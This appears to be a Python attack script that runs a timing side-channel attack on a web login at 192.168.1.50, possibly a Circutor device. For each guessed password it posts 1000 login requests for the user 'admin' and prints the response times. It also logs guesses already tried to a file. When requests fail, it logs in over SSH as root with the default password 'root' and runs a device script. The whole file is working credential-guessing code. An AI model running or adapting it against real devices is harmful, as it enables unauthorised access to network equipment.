from time import sleep

import requests
from pexpect import pxssh
from requests import RequestException

username = "admin"
target_url = "http://192.168.1.50"
ip = '192.168.1.50'
cookie = 'ae3410008a00f3450d'

data = {}

header = {'Host': target_url,
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Referer': target_url,
          'Cookie': 'QSESSIONID_' + ip + '=' + cookie,
          'Connection': 'close',
          'Content-Type': 'application/x-www-form-urlencoded'}


def urlPostTiming(guess_password, passAnalized):
    if guess_password not in passAnalized:
        for i in range(1000):
            try:

                print('try number: {}'.format(i))
                print('try with: ' + guess_password)

                elapse = requests.post(target_url, headers=header,
                                       data={'language': 'es', 'user': username,
                                             'password': guess_password}).elapsed.total_seconds()
                print(elapse)


            except RequestException as e:
                sleep(20)
                s = pxssh.pxssh()
                if not s.login('192.168.1.50', 'root', 'root'):
                    print("SSH session failed on login.")
                    print(str(s))
                else:
                    print("SSH session login successful")
                    s.sendline('./circutor.sh')
                    s.prompt()  # match the prompt
                sleep(20)
        file = open('analyzedPass.txt', 'a')
        file.write(guess_password + '\n')
        file.close()


def generateData(guess):
    f = open('analyzedPass.txt', 'r')

    passAnalyzed = []
    for line in f:
        passAnalyzed.append(line.strip())
    print(passAnalyzed)

    urlPostTiming(guess, passAnalyzed)
